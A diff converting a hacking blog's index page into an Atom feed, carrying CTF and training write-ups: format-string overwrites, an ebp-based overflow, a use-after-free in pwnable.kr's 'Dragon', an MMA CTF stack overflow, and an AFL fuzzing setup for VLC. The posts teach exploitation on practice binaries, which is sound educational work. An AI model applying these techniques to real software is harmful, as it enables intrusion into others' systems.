@@ -1,119 +1,28 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
 
-<!DOCTYPE html>
-<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
-<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
-<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="ja"><!--<![endif]-->
-<head>
-  <meta charset="utf-8">
-  <title>Sheep Shellcode</title>
-  <meta name="author" content="Vincent Moscatello">
-
-  
-  <meta name="description" content="UF-SIT, UF’s cyber security club, is holding lightning talks on the 17th of Novemeber! I’ve decided that an awesome way to peek people’s interest in &hellip;">
-  
-
-  <!-- http://t.co/dKP3o1e -->
-  <meta name="HandheldFriendly" content="True">
-  <meta name="MobileOptimized" content="320">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-
-  
-  <link rel="canonical" href="http://sheepshellcode.com/">
-  <link href="/favicon.png" rel="icon">
-  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
-  <link href="/atom.xml" rel="alternate" title="Sheep Shellcode" type="application/atom+xml">
-  <script src="/javascripts/modernizr-2.0.js"></script>
-  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
-  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
-  <script src="/javascripts/octopress.js" type="text/javascript"></script>
-  
-  
-  <script type="text/javascript">
-    var _gaq = _gaq || [];
-    _gaq.push(['_setAccount', 'UA-67946241-1']);
-    _gaq.push(['_trackPageview']);
-
-    (function() {
-      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
-      ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
-      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
-    })();
-  </script>
-
-
-</head>
-
-<body >
-  <div id="container">
-    <header role="banner"><hgroup>
-  <h1><a href="/">Sheep Shellcode</a></h1>
-  
-    <h2>The hackery blog of Vincent Moscatello.</h2>
-  
-</hgroup>
-
-</header>
-    <nav role="navigation"><ul class="subscription" data-subscription="rss">
-  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
-  
-</ul>
-  
-<form action="https://www.google.com/search" method="get">
-  <fieldset role="search">
-    <input type="hidden" name="q" value="site:sheepshellcode.com" />
-    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
-  </fieldset>
-</form>
-  
-<ul class="main-navigation">
-  <li><a href="/">Blog</a></li>
-  <li><a href="/tutorials">Tutorials</a></li>
-  <li><a href="/resume/MoscatelloResume.pdf">Resume</a></li>
-  <li><a href="/archives">Archives</a></li>
-</ul>
-
-</nav>
-    <div id="main">
-      <div id="content">
-        <div class="blog-index">
-  
-  
-  
-    <article>
-      
-  <header>
+  <title><![CDATA[Sheep Shellcode]]></title>
+  <link href="http://sheepshellcode.com/atom.xml" rel="self"/>
+  <link href="http://sheepshellcode.com/"/>
+  <updated>2016-04-12T20:58:40-04:00</updated>
+  <id>http://sheepshellcode.com/</id>
+  <author>
+    <name><![CDATA[Vincent Moscatello]]></name>
     
-      <h1 class="entry-title"><a href="/blog/2015/11/12/tale-of-a-format-string/">Tale of a Format String</a></h1>
-    
-    
-      <div class="post-meta">
-        <p class="meta">
-          <span class="timestamp">- 
-
-
-
-
-
-
-
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
 
   
-
-
-
-<time datetime="2015-11-12T15:09:04-05:00" pubdate data-updated="true"></time> -</span>
-          
-        </p>
-      </div>
-    
-  </header>
-
-
-  <div class="entry-content"><p>UF-SIT, UF’s cyber security club, is holding lightning talks on the 17th of Novemeber! I’ve decided that an awesome way to peek people’s interest in reverse engineering and exploitation is to give a talk on format string vulnerabilities. This talk is aimed at people that really want to learn more, but are stuck doing basic stack-based buffer overflows.</p>
+  <entry>
+    <title type="html"><![CDATA[Tale of a Format String]]></title>
+    <link href="http://sheepshellcode.com/blog/2015/11/12/tale-of-a-format-string/"/>
+    <updated>2015-11-12T15:09:04-05:00</updated>
+    <id>http://sheepshellcode.com/blog/2015/11/12/tale-of-a-format-string</id>
+    <content type="html"><![CDATA[<p>UF-SIT, UF’s cyber security club, is holding lightning talks on the 17th of Novemeber! I’ve decided that an awesome way to peek people’s interest in reverse engineering and exploitation is to give a talk on format string vulnerabilities. This talk is aimed at people that really want to learn more, but are stuck doing basic stack-based buffer overflows.</p>
 
 <p>To understand format string exploits, first you need a program that can be exploited. I decided to write a program that should be easily exploitable on Ubuntu 14.04 with all of the standard flags for gcc left enabled.</p>
 
-<p><img class="center" src="/images/format-strings/normalrun.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/format-strings/normalrun.png"></p>
 
 <p>It’s a mocking game! It simply repeats back whatever string it receives. Let’s take a look at the source code of the program to see if we can come up with an idea on how to exploit it.</p>
 
@@ -202,21 +111,21 @@
 
 <p>It’s a very subtle difference, but watch what happens when we enter some input that the programmer was not expecting like the character percent followed by the character x.</p>
 
-<p><img class="center" src="/images/format-strings/format-string-percent-x.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/format-strings/format-string-percent-x.png"></p>
 
 <p>We’ve started to leak information from the stack! In fact we’ve leaked so much information that we’ve reached the area on the stack where our format string was stored! Just for clarity the format string is the first line with (AAAABBBBCC..). Let’s stop a moment to see why this happens.</p>
 
-<p><img class="center" src="/images/format-strings/format-string.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/format-strings/format-string.png"></p>
 
 <p>On x86, when a function is called using CDECL calling conventions, its parameters are pushed on the stack in reverse order as seen above. When printf wants to use parameter 2, the second percent d, it reaches all the way up the stack to 2 or (esp + 8). When we control these percent d, like in our vulnerable program, we can read as far up the stack as we want!</p>
 
-<p><img class="center" src="/images/format-strings/fgets.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/format-strings/fgets.png"></p>
 
 <p>When we look at this assembly language in IDA, fgets is storing the format string itself at esp+1C (esp+28) This means that by going as far as 7 percent xs we can start reaching data we can control!</p>
 
 <p>Printf even has a useful feature called direct parameter access that allows us to skip placing percent x over and over again and just reference a value from its relative location on the stack!</p>
 
-<p><img class="center" src="/images/format-strings/direct-parameter-access.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/format-strings/direct-parameter-access.png"></p>
 
 <p>I am sure it has an “actual” application outside of exploitation, but let’s be honest that’s pretty darn convenient.</p>
 
@@ -239,23 +148,23 @@
 
 <p>Later on in the program, we see that an instance of the struct, called test, is initialized in the bss segment right above main. Let’s find this struct in memory using IDA.</p>
 
-<p><img class="center" src="/images/format-strings/test-struct-before.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/format-strings/test-struct-before.png"></p>
 
 <p>When we look at this memory in debug mode we see that the address of the lose function (picture below) is written to this address.</p>
 
-<p><img class="center" src="/images/format-strings/lose-function.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/format-strings/lose-function.png"></p>
 
 <p>The address is written into memory using little endian byte order.</p>
 
-<p><img class="center" src="/images/format-strings/lose-in-struct.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/format-strings/lose-in-struct.png"></p>
 
 <p>We want to change this address stored at 0804A060 to the address of our win function (picture below)</p>
 
-<p><img class="center" src="/images/format-strings/you-win-function.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/format-strings/you-win-function.png"></p>
 
 <p>An obvious issue that we encounter is that the address 0x08048501 = 134513921. To use our percent-n method we would have to have printf print almost 134 megabytes worth of junk! That’s a rather huge amount of writing. Let’s exploit the fact we are using little endian byte order! We can perform 4 writes instead of 1 write. The picture below provides an illustration of what our final exploit will look like.</p>
 
-<p><img class="center" src="/images/format-strings/format-string-structure.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/format-strings/format-string-structure.png"></p>
 
 <p>To calculate the “value to write” for the percent u we can use a simple function that increments our total byte counter until the lowest byte is equal to the byte we want to write. We can then return the total number of bytes we have to add to our format string to get there.</p>
 
@@ -375,88 +284,52 @@
 
 <p>This is what our exploit will look like when printed to standard out:</p>
 
-<p><img class="center" src="/images/format-strings/printexploit.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/format-strings/printexploit.png"></p>
 
 <p>Let’s see what happens when we shove the exploit into our mocking game program!</p>
 
-<p><img class="center" src="/images/format-strings/test-winning.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/format-strings/test-winning.png"></p>
 
 <p>HACK THE PLANET! We win!</p>
 
-<p><img class="center" src="/images/format-strings/victory.png"></p>
-</div>
+<p><img class="center" src="http://sheepshellcode.com/images/format-strings/victory.png"></p>
+]]></content>
+  </entry>
   
-  
+  <entry>
+    <title type="html"><![CDATA[Login + ? = Profit]]></title>
+    <link href="http://sheepshellcode.com/blog/2015/10/19/login-profit/"/>
+    <updated>2015-10-19T22:06:40-04:00</updated>
+    <id>http://sheepshellcode.com/blog/2015/10/19/login-profit</id>
+    <content type="html"><![CDATA[<p>Simple login is a 50 point 32bit pwnable from pwnable.kr! Although finding the vulnerability in this challenge was pretty simple, the actual exploitation was a bit trickier than your standard buffer overflow. This write-up contains spoilers so if that’s important to you, try out the challenge for yourself first!</p>
 
-
-      <footer>
-      
-      - <a href="/blog/2015/11/12/tale-of-a-format-string/">Tale of a Format String</a>
-      <time datetime="2015-11-12T15:09:04-05:00" pubdate><span class='month'>Nov</span> <span class='day'>12</span> <span class='year'>2015</span></time>
-      
-      </footer>
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/10/19/login-profit/">Login + ? = Profit</a></h1>
-    
-    
-      <div class="post-meta">
-        <p class="meta">
-          <span class="timestamp">- 
-
-
-
-
-
-
-
-
-  
-
-
-
-<time datetime="2015-10-19T22:06:40-04:00" pubdate data-updated="true"></time> -</span>
-          
-        </p>
-      </div>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Simple login is a 50 point 32bit pwnable from pwnable.kr! Although finding the vulnerability in this challenge was pretty simple, the actual exploitation was a bit trickier than your standard buffer overflow. This write-up contains spoilers so if that’s important to you, try out the challenge for yourself first!</p>
-
-<p><img class="center" src="/images/simple-login/normal.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/simple-login/normal.png"></p>
 
 <p>The point of this challenge is to try and bypass the “Authenticate” prompt above. When running the executable normally the program appears to take whatever string you entered, perform some operation on it, then hash that value and print the hash below.</p>
 
-<p><img class="center" src="/images/simple-login/base64decode.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/simple-login/base64decode.png"></p>
 
 <p>Doing some further reverse engineering reveals that this “operation” before hashing is simply a base64 decoding of whatever string you entered.</p>
 
-<p><img class="center" src="/images/simple-login/copy-to-datasegment.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/simple-login/copy-to-datasegment.png"></p>
 
 <p>Further reverse engineering also revealed that the program has a function called auth (0x08049402 above).  When called the auth function compares the hashed value of your base64 decoded string to a hash compiled right into the executable. An obvious first approach would be to try and brute the hash but unfortunately the password for the hash was not easily guessable.</p>
 
-<p><img class="center" src="/images/simple-login/second-memcpy.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/simple-login/second-memcpy.png"></p>
 
 <p>It’s time to get a bit more creative, upon further analysis of the auth function it becomes clear that it may be possible to cause a 4 byte overflow using the memcpy function. You can figure this out by looking at addresses 0x080492B1, 0x080492B4, and 0x080492A2. Starting at address 0x080492B1, the address of the base pointer minus 20 is loaded into eax. At 0x080492B4 12 bytes are then added to eax. This makes 20 – 12 = 8 bytes of space for the memcpy function to write into. At 0x080492A2, arg_0 contains the length of our string after it’s been base64 decoded.  This string length can be up to 12 bytes large! We can copy 12 bytes into an 8 byte buffer, BUFFER OVERFLOW!</p>
 
 <p>But wait… A FOUR byte buffer overflow and not an EIGHT byte buffer overflow? All we can do with that is control ebp not the instructional pointer (eip)! To figure out a solution I relied on an obscure phrack article I read about a year ago <a href="http://phrack.org/issues/55/8.html">http://phrack.org/issues/55/8.html</a> . In the article klog describes how he is able to get code execution by exploiting a 1 byte overflow into ebp. Although his method doesn’t really work here with modern OS protections like DEP/ASLR enabled, we can still adapt his method to solve our problem.</p>
 
-<p><img class="center" src="/images/simple-login/diagram.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/simple-login/diagram.png"></p>
 
 <p>The diagram I have drawn above does a good job at explaining how the attack works. In summation, we are using the fact that we control ebp after two function returns to get code execution. The trickiest part was figuring out the address to overwrite the base pointer with since most things were moving.</p>
 
-<p><img class="center" src="/images/simple-login/datasegment.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/simple-login/datasegment.png"></p>
 
 <p>Fortunately, our string is copied into the bss segment before making a call to auth. There is enough room here to allow us to store a fake ebp (just some padding) and an address we want to jump to.</p>
 
-<p><img class="center" src="/images/simple-login/system.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/simple-login/system.png"></p>
 
 <p>BUT wait! The bss segment is unfortunately not executable so we can’t simply put some shellcode in it. In fact, there wouldn’t really be enough room to store the shellcode to begin with. The solution is to jump back into the text segment at the address in the picture above so we can all system.
 Excellent! We now know everything we need to in order to write an exploit in python.</p>
@@ -500,80 +373,44 @@ Excellent! We now know everything we need to in order to write an exploit in pyt
 
 <p>And finally, let’s claim the spoils of victory by feeding our exploit through ncat.</p>
 
-<p><img class="center" src="/images/simple-login/victory.png"></p>
-</div>
+<p><img class="center" src="http://sheepshellcode.com/images/simple-login/victory.png"></p>
+]]></content>
+  </entry>
   
-  
-
-
-      <footer>
-      
-      - <a href="/blog/2015/10/19/login-profit/">Login + ? = Profit</a>
-      <time datetime="2015-10-19T22:06:40-04:00" pubdate><span class='month'>Oct</span> <span class='day'>19</span> <span class='year'>2015</span></time>
-      
-      </footer>
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/10/12/how-to-kill-a-dragon/">How to Kill a Dragon</a></h1>
-    
-    
-      <div class="post-meta">
-        <p class="meta">
-          <span class="timestamp">- 
-
-
-
-
-
-
-
-
-  
-
-
-
-<time datetime="2015-10-12T16:08:17-04:00" pubdate data-updated="true"></time> -</span>
-          
-        </p>
-      </div>
-    
-  </header>
-
-
-  <div class="entry-content"><p><img class="center" src="/images/dragon/dragon.png" width="459" height="437"></p>
+  <entry>
+    <title type="html"><![CDATA[How to Kill a Dragon]]></title>
+    <link href="http://sheepshellcode.com/blog/2015/10/12/how-to-kill-a-dragon/"/>
+    <updated>2015-10-12T16:08:17-04:00</updated>
+    <id>http://sheepshellcode.com/blog/2015/10/12/how-to-kill-a-dragon</id>
+    <content type="html"><![CDATA[<p><img class="center" src="http://sheepshellcode.com/images/dragon/dragon.png" width="459" height="437"></p>
 
 <p>Dragon is a 75 point pwnable from pwnable.kr. That being said, if you are afraid of spoilers, DON’T continue! Try out the challenge for yourself! The binary is a 32 bit dynamically linked elf that still has most of its symbols left in tack. It takes a bit of reverse engineering to actually figure out how to exploit it though.</p>
 
-<p><img class="center" src="/images/dragon/welcome.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/dragon/welcome.png"></p>
 
 <p>You can start the challenge by connecting with netcat to pwnable.kr on port 9004. The premise of the challenge is pretty simple, your older brother has designed an RPG game that’s impossible to win. The objective? Kill the dragon, pwn the box, and get the flag.</p>
 
 <p>With ASLR and DEP enabled it was clear that this challenge was meant to be solved in a very particular way. After playing with the application for a bit, I loaded the binary into IDA.</p>
 
-<p><img class="center" src="/images/dragon/find-the-secret.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/dragon/find-the-secret.png"></p>
 
 <p>The actual main function of the program was relatively uninteresting until it makes a call to the PlayGame function seen above. This is the same dialogue that asks you to select 1 if you would like to play as a knight and select 2 if you would like to play as a priest. The disassembly reveals a third option (3) that allows you to access a secret level!</p>
 
-<p><img class="center" src="/images/dragon/secretlevel.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/dragon/secretlevel.png"></p>
 
 <p>Unfortunately to actually access the secret level, you need a password and that password is not found anywhere in the binary. The only interesting part about the secret level is that it makes a call to system.</p>
 
-<p><img class="center" src="/images/dragon/victory.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/dragon/victory.png"></p>
 
 <p>Assuming that at some point we find a vulnerability that gives us control of the instructional pointer, we should be able to jump directly to the address 0x08048DBF. This should work since the location of the text segment shouldn’t relocate because the application is compiled without PIE.</p>
 
 <p>So how do we actually kill this dragon? The answer lies in the data structures used to keep track of the dragon’s information. At the beginning of the PlayGame function, the game allocates memory for two structs on the heap.</p>
 
-<p><img class="center" src="/images/dragon/malloc.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/dragon/malloc.png"></p>
 
 <p>The first 16 byte struct is used to keep track of the player’s information. The values in this struct are determined by weather the player chose a knight class or a priest class. These two classes have different attacks and different amounts of health.</p>
 
-<p><img class="center" src="/images/dragon/priest-or-knight.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/dragon/priest-or-knight.png"></p>
 
 <p>The priest has a unique attack where he can use a magic shield to avoid taking any damage. This shield does have a certain amount of mana and needs to be recharged after a couple of uses.</p>
 
@@ -588,7 +425,7 @@ Excellent! We now know everything we need to in order to write an exploit in pyt
 
 <p>There are two types of dragons a baby dragon and a mother dragon. The baby dragon has less health but deals more damage and has a greater life regeneration. The mama dragon has more health but a lower damage and lower life regeneration. The kind of dragon you get to fight is determined by a counter that alternates back and forth between baby dragon and mama dragon. This counter does not reset between rounds.</p>
 
-<p><img class="center" src="/images/dragon/mother-dragon.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/dragon/mother-dragon.png"></p>
 
 <p>One thing you may have noticed in the picture above is that the dragon’s health is stored in a single byte at eax+8. This means that the dragon’s health can only be within the range of 0 to 127. A dragon is considered defeated when its health has turned 0.</p>
 
@@ -596,15 +433,15 @@ Excellent! We now know everything we need to in order to write an exploit in pyt
 
 <p>Fantastic! So now we know how to defeat the dragon! But how does defeating the dragon help us get a shell? Defeating the dragon causes a use after free condition which can be exploited to gain control of the instructional pointer.</p>
 
-<p><img class="center" src="/images/dragon/free.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/dragon/free.png"></p>
 
 <p>Normally, when the dragon wins, the dragon struct is first freed and the “I defeated a dragon condition” is returned as false, or zero, in the register eax. However if eax returns 1 like in the green box, the dragon struct is used later on in the code even though its already been freed.</p>
 
-<p><img class="center" src="/images/dragon/call-eax.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/dragon/call-eax.png"></p>
 
 <p>In some cases a mistake like this might only cause a crash, in this case though we make a call to malloc again that is the same size as the dragon struct that we just freed. Due to the way binning works on linux, the new malloc should be allocated in the block we just freed. This new malloc is user controlled and is meant to store the player’s name. If we enter the player’s name as an address then the call eax, which used to have a function pointer, will actually point to wherever we want it to!</p>
 
-<p><img class="center" src="/images/dragon/use-after-free.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/dragon/use-after-free.png"></p>
 
 <p>Let’s use some clever python to point the instructional pointer back inside of the secret function and get a shell on the remote machine.</p>
 
@@ -663,54 +500,16 @@ Excellent! We now know everything we need to in order to write an exploit in pyt
 
 <p>Finally, lets enjoy the spoils of victory by piping the script through ncat! What can I say, it used to be a dragon once but then it took a use after free to the knee.</p>
 
-<p><img class="center" src="/images/dragon/winning.png"></p>
-</div>
+<p><img class="center" src="http://sheepshellcode.com/images/dragon/winning.png"></p>
+]]></content>
+  </entry>
   
-  
-
-
-      <footer>
-      
-      - <a href="/blog/2015/10/12/how-to-kill-a-dragon/">How to Kill a Dragon</a>
-      <time datetime="2015-10-12T16:08:17-04:00" pubdate><span class='month'>Oct</span> <span class='day'>12</span> <span class='year'>2015</span></time>
-      
-      <span class="categories">posted in <a class='category' href='/blog/categories/ctf/'>ctf</a></span>
-      
-      </footer>
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/09/21/an-american-fuzzylop-environment/">An American Fuzzylop Environment</a></h1>
-    
-    
-      <div class="post-meta">
-        <p class="meta">
-          <span class="timestamp">- 
-
-
-
-
-
-
-
-
-  
-
-
-
-<time datetime="2015-09-21T11:43:48-04:00" pubdate data-updated="true"></time> -</span>
-          
-        </p>
-      </div>
-    
-  </header>
-
-
-  <div class="entry-content"><p>In an effort to try and find some zero-days in VLC media player, I’ve been trying to set up a solid environment for fuzzing with American Fuzzy Lop. At the beginning of this project my hardware was limited to a DELL 740 with components that were slowly dying. Well it was between fuzzing on that and fuzzing on my laptop. After reading afl’s readme I reconsidered…</p>
+  <entry>
+    <title type="html"><![CDATA[An American Fuzzylop Environment]]></title>
+    <link href="http://sheepshellcode.com/blog/2015/09/21/an-american-fuzzylop-environment/"/>
+    <updated>2015-09-21T11:43:48-04:00</updated>
+    <id>http://sheepshellcode.com/blog/2015/09/21/an-american-fuzzylop-environment</id>
+    <content type="html"><![CDATA[<p>In an effort to try and find some zero-days in VLC media player, I’ve been trying to set up a solid environment for fuzzing with American Fuzzy Lop. At the beginning of this project my hardware was limited to a DELL 740 with components that were slowly dying. Well it was between fuzzing on that and fuzzing on my laptop. After reading afl’s readme I reconsidered…</p>
 
 <blockquote><p>“That said, especially when fuzzing on less suitable hardware (laptops, smartphones, etc), it&#8217;s not entirely impossible for something to blow up.”</p></blockquote>
 
@@ -723,17 +522,17 @@ Excellent! We now know everything we need to in order to write an exploit in pyt
 
 <p>Introducing megaman and Kirby:</p>
 
-<p><img class="center" src="/images/aflenv/computers.jpg" width="1632" height="918"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/aflenv/computers.jpg" width="1632" height="918"></p>
 
 <p>Megaman is a DELL 740 with a AMD 2.40 GHZ processor, 2.0 GB of ram and a 160GB hard drive. Kirby is a slightly more beefy machine with a 3.0 GHZ Core 2 Duo processor, 4GB of ram, and a 250GB hard drive. The computers did not come with an operating system installed on them and unfortunately I didn’t have access to a monitor. It was time to be resourceful. I decided to take out the hard drives and install debian on them using vmware and a SATA to usb cable.</p>
 
-<p><img class="center" src="/images/aflenv/harddrive.jpg" width="1632" height="918"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/aflenv/harddrive.jpg" width="1632" height="918"></p>
 
 <p>The installation went perfectly! I ended up installing two important packages before placing the hard drives back in the computers, ssh-server and xvnc4server. I used a small dlink router I had lying around from previous reverse engineering projects so I could easily access both computers from an internal network.</p>
 
 <p>To actually give these computers access to the outside internet, I set the gateway of these machine to be my laptop. I used iptables to forward the fuzzing box’s traffic through the laptops wifi interface. Yep. The room hosting Kirby and megaman did not have access to a convenient Ethernet outlet.</p>
 
-<p><img class="center" src="/images/aflenv/vnc.png" width="597" height="468"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/aflenv/vnc.png" width="597" height="468"></p>
 
 <p>At this point everything was working! I was able to connect to the VNC servers which would drop me into an extremely minimal window manager called mwm. After experiencing hiccups with lubuntu I wanted to stick with something as stripped back as possible.</p>
 
@@ -757,7 +556,7 @@ Excellent! We now know everything we need to in order to write an exploit in pyt
 
 <p>Being able to access the afl stats via tmux is extremely convenient! The redirection was as simple as fuzz.sh > /dev/pts/7</p>
 
-<p><img class="center" src="/images/aflenv/aflmuxed.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/aflenv/aflmuxed.png"></p>
 
 <p>What was I fuzzing exactly? I decided that the first round of fuzzing would be on windows media files since vlc’s demuxer looked rather complicated.</p>
 
@@ -784,67 +583,31 @@ Excellent! We now know everything we need to in order to write an exploit in pyt
 
 
 
-</div>
+]]></content>
+  </entry>
   
-  
-
-
-      <footer>
-      
-      - <a href="/blog/2015/09/21/an-american-fuzzylop-environment/">An American Fuzzylop Environment</a>
-      <time datetime="2015-09-21T11:43:48-04:00" pubdate><span class='month'>Sep</span> <span class='day'>21</span> <span class='year'>2015</span></time>
-      
-      </footer>
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/09/08/mma-ctf-rock-paper-shellcode/">MMA CTF: Rock Paper SHELLCODE</a></h1>
-    
-    
-      <div class="post-meta">
-        <p class="meta">
-          <span class="timestamp">- 
-
-
-
-
-
-
-
-
-  
-
-
-
-<time datetime="2015-09-08T14:32:30-04:00" pubdate data-updated="true"></time> -</span>
-          
-        </p>
-      </div>
-    
-  </header>
-
-
-  <div class="entry-content"><p>MMA CTF: Rock Paper SHELLCODE</p>
+  <entry>
+    <title type="html"><![CDATA[MMA CTF: Rock Paper SHELLCODE]]></title>
+    <link href="http://sheepshellcode.com/blog/2015/09/08/mma-ctf-rock-paper-shellcode/"/>
+    <updated>2015-09-08T14:32:30-04:00</updated>
+    <id>http://sheepshellcode.com/blog/2015/09/08/mma-ctf-rock-paper-shellcode</id>
+    <content type="html"><![CDATA[<p>MMA CTF: Rock Paper SHELLCODE</p>
 
 <p>I had a really awesome time this weekend working on MMA CTF with the guys at ufsit.org ! Although the CTF lasted 48 hours, I was only able to put in 8 hours or so worth of time due to exams. I pretty much only went after pwnables, but checkout <a href="http://andrewjkerr.com/blog/mma-ctf-writeup/">http://andrewjkerr.com/blog/mma-ctf-writeup/</a> for an awesome web write-up from our secretary.</p>
 
-<p><img class="center" src="/images/rps/run-normal.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/rps/run-normal.png"></p>
 
 <p>The first challenge I solved was a 50 point pwnable called rps. The point of this challenge was to try and win 50 games of rock paper scissors against a remote service. They provided us with the binary for reverse engineering but not the text file that contains the flag.</p>
 
 <p>When you do the math it becomes very clear that brute forcing 50 games of rock paper scissors is not going to be feasible.  The probability of doing that successfully would be (1/3)<sup>50</sup>. Time to load the binary into IDA…</p>
 
-<p><img class="center" src="/images/rps/vulnerability.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/rps/vulnerability.png"></p>
 
 <p>It was actually very easy to identify the vulnerability in this application. The program imports and makes a call to the vulnerable function gets. This results in an 80 byte stack based buffer overflow. The only part that gave me trouble was the actual exploitation.</p>
 
 <p>My first approach was to try and overwrite the saved rip and just point it to the victory condition found in the text segment (picture below).</p>
 
-<p><img class="center" src="/images/rps/victory.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/rps/victory.png"></p>
 
 <p>This was pretty easy to test out with about 5 lines of python.</p>
 
@@ -867,62 +630,24 @@ Excellent! We now know everything we need to in order to write an exploit in pyt
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p><img class="center" src="/images/rps/overflow.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/rps/overflow.png"></p>
 
 <p>After resolving some issues with canonical addressing, I was able to get control of rip. Unfortunately the location I was pointing rip into was not getting me the code execution I wanted. I actually have to go back and figure out why that was happening still. I came up with a different solution to the problem before spending more time on my old solution.</p>
 
-<p><img class="center" src="/images/rps/draw.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/rps/draw.png"></p>
 
 <p>Instead of overflowing rip I figured out that the seed which generated the choice of RPS was stored on the stack above where the user had to enter their name. Perfect! By overwriting the four bytes of entropy from /dev/random with AAAA it was possible to get the same sequence of rock paper scissors over and over again. From there we just shoved the solution through ncat.</p>
 
-<p><img class="center" src="/images/rps/pwned.png"></p>
-</div>
+<p><img class="center" src="http://sheepshellcode.com/images/rps/pwned.png"></p>
+]]></content>
+  </entry>
   
-  
-
-
-      <footer>
-      
-      - <a href="/blog/2015/09/08/mma-ctf-rock-paper-shellcode/">MMA CTF: Rock Paper SHELLCODE</a>
-      <time datetime="2015-09-08T14:32:30-04:00" pubdate><span class='month'>Sep</span> <span class='day'>08</span> <span class='year'>2015</span></time>
-      
-      <span class="categories">posted in <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/sit/'>sit</a></span>
-      
-      </footer>
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/09/02/a-tiny-easy-ctf-challenge/">A Tiny Easy CTF Challenge</a></h1>
-    
-    
-      <div class="post-meta">
-        <p class="meta">
-          <span class="timestamp">- 
-
-
-
-
-
-
-
-
-  
-
-
-
-<time datetime="2015-09-02T11:40:10-04:00" pubdate data-updated="true"></time> -</span>
-          
-        </p>
-      </div>
-    
-  </header>
-
-
-  <div class="entry-content"><p>tiny_easy was a great example of how you can still put a large amount of complexity into a challenge that’s only 4 instructions. If you haven’t tried the challenge on your own make sure you check out at <a href="http://pwnable.kr/play.php">http://pwnable.kr/play.php</a> . This write-up contains spoilers, consider yourself warned!</p>
+  <entry>
+    <title type="html"><![CDATA[A Tiny Easy CTF Challenge]]></title>
+    <link href="http://sheepshellcode.com/blog/2015/09/02/a-tiny-easy-ctf-challenge/"/>
+    <updated>2015-09-02T11:40:10-04:00</updated>
+    <id>http://sheepshellcode.com/blog/2015/09/02/a-tiny-easy-ctf-challenge</id>
+    <content type="html"><![CDATA[<p>tiny_easy was a great example of how you can still put a large amount of complexity into a challenge that’s only 4 instructions. If you haven’t tried the challenge on your own make sure you check out at <a href="http://pwnable.kr/play.php">http://pwnable.kr/play.php</a> . This write-up contains spoilers, consider yourself warned!</p>
 
 <p>The challenge starts by prompting you to ssh into a box running Ubuntu. I tried cat-ing /proc/sys/kernel/randomize_va_space and it looks like they left ASLR enabled. Excellent.</p>
 
@@ -931,41 +656,41 @@ Excellent! We now know everything we need to in order to write an exploit in pyt
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p><img class="center" src="/images/tiny-easy/pwnablekr.png"></p>
+<p><img class="center" src="http://sheepshellcode.com/images/tiny-easy/pwnablekr.png"></p>
 
